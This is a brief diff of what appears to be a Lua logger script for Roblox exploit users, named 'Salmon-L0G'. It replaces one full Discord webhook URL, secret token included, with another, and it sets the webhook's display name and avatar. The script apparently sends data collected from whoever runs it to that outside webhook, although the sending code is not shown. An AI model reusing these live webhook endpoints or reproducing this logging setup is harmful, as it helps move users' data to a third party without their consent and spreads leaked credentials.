@@ -10,7 +10,7 @@ local webhookcheck =
    "Kid with shit exploit"
 
 local url =
-   "https://discord.com/api/webhooks/1371211665068130305/yngbA7gYpaewhtun95VhvderlY_wDtwkZ1ngMsug5Z8kob0BDyJIgYaV0cBEX0CAm5dj" --pretty obvious what to do here
+   "https://discord.com/api/webhooks/1394003704746741781/sCHgs18dUx_faqRL7KJZkmngr97mY3wGnuXCDxktZwc0xa2ifOC90cp7P5MqMtercJvH" --pretty obvious what to do here
 local data = {
             ["username"] = "Salmon-L0G", --webhook name thing idk
             ["avatar_url"] = "https://cdn.upload.systems/uploads/haO2MM1R.png", --avatar image url
